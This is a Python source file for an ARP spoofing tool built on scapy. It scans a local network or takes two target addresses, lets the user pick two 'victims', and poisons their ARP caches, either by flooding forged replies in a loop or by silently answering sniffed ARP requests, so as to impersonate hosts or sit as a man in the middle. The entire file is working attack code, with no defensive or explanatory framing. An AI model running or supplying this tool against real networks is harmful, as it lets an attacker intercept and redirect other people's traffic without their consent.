from .neighbourhood import start_scan
from .utilities import get_my_mac_address, get_mac_address
import argparse
import threading
from scapy.all import Ether, ARP, sendp, sniff

class Address:
    def __init__(self, mac, ip, interface):
        self.mac = mac
        self.ip = ip
        self.interface = interface

def create_ARP(mac_attacker, victim, destination):
    arp = Ether() / ARP()
    arp[Ether].src = mac_attacker
    arp[Ether].dst = 'ff:ff:ff:ff:ff:ff'
    arp[ARP].hwsrc = mac_attacker
    arp[ARP].psrc = destination.ip
    arp[ARP].hwdst = victim.mac
    arp[ARP].pdst = victim.ip
    
    return arp

def send_all_out_ARP(interface, mac_attacker, victim, destination):

    arp = create_ARP(mac_attacker, victim, destination)

    sendp(arp, iface=interface, loop=1, inter=2)

def send_all_out_mitm_ARP(interface, mac_attacker, victim1, victim2):

    arp1 = create_ARP(mac_attacker, victim1, victim2)
    arp2 = create_ARP(mac_attacker, victim2, victim1)

    sendp([arp1, arp2], iface=interface, loop=1, inter=1, verbose=False)

def fake_response(pkt, interface, victim1, victim2):
    if pkt[ARP].op == 1 and (pkt[ARP].pdst == victim2.ip and pkt[ARP].psrc == victim1.ip):
        response = Ether(dst = pkt[Ether].src) / ARP(op = 'is-at', psrc = pkt[ARP].pdst, hwdst = pkt[ARP].hwsrc, pdst = pkt[ARP].psrc)

        sendp(response, iface = interface, verbose = False)

def fake_response_mitm(pkt, interface, victim1, victim2):
    if pkt[ARP].op == 1 and ((pkt[ARP].pdst == victim1.ip and pkt[ARP].psrc == victim2.ip) or (pkt[ARP].pdst == victim2.ip and pkt[ARP].psrc == victim1.ip)):
        response = Ether(dst = pkt[Ether].src) / ARP(op = 'is-at', psrc = pkt[ARP].pdst, hwdst = pkt[ARP].hwsrc, pdst = pkt[ARP].psrc)

        sendp(response, iface = interface, verbose = False)

def silent_ARP_poisoning(victim1, victim2):
    interface = victim1.interface

    filter_expression = 'arp'
    sniff(filter = filter_expression, prn = lambda pkt: fake_response(pkt, interface, victim1, victim2))

def silent_mitm_ARP_poisoning(victim1, victim2):
    interface = victim1.interface
    
    filter_expression = 'arp'
    sniff(filter = filter_expression, prn = lambda pkt: fake_response_mitm(pkt, interface, victim1, victim2))

def print_menu(scan_list):
    for i, dev in enumerate(scan_list):
        print(' ' + str(i+1) + ':')
        print('\tIP  = ' + str(dev.ip))
        print('\tMAC = ' + str(dev.mac))

def mitm_attack(victim1, victim2, interface, silent):

    print('Man In The Middle Attack\n')
    if silent:
        '''silent_mitm_ARP_poisoning(victim1, victim2)'''
        send_thread = threading.Thread(target=silent_mitm_ARP_poisoning, args=(victim1, victim2))
    else:
        '''send_all_out_mitm_ARP(interface, get_my_mac_address(interface), victim1, victim2)'''
        send_thread = threading.Thread(target=send_all_out_mitm_ARP, args=(interface, get_my_mac_address(interface), victim1, victim2))
    
    send_thread.start()

def spoof_attack(victim1, victim2, interface, silent):

    print('Spoofing Attack\n')
    if silent:
        '''silent_ARP_poisoning(victim1, victim2)'''
        send_thread = threading.Thread(target=silent_ARP_poisoning, args=(victim1, victim2))
    else:
        '''send_all_out_ARP(interface, get_my_mac_address(interface), victim1, victim2)'''
        send_thread = threading.Thread(target=send_all_out_ARP, args=(interface, get_my_mac_address(interface), victim1, victim2))
    
    send_thread.start()

def choose_victims(scan_list):
    print('Choose first victim from list:')
    print_menu(scan_list)
    index1 = int(input(' >> '))

    print('Choose second victim from list:')
    print_menu(scan_list)
    index2 = int(input(' >> '))

    return scan_list[index1-1], scan_list[index2-1]

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('interface', help='Interface for network scan')
    parser.add_argument('-m', '--mitm', action='store_true', help='Enable MITM attack')
    parser.add_argument('-s', '--silent', action='store_true', help='Enable Silent mode')
    parser.add_argument('-t', '--targets', nargs=2, metavar=('ip1', 'ip2'), help='Specify two target IP addresses')
    parser.add_argument('-v', '--verbose', action='store_true', help='Enable verbose mode')
    args = parser.parse_args()

    interface = args.interface
    silent = args.silent
    mitm = args.mitm
    targets = args.targets
    verbose = args.verbose

    if targets is None:
        scan_list = [Address(*x) for x in start_scan(verbose, interface)]
        victim1, victim2 = choose_victims(scan_list)
    else:
        mac1 = get_mac_address(targets[0])
        mac2 = get_mac_address(targets[1])

        victim1 = Address(mac1, targets[0], interface)
        victim2 = Address(mac2, targets[1], interface)

    if mitm:
        mitm_attack(victim1, victim2, interface, silent)
    else:
        spoof_attack(victim1, victim2, interface, silent)
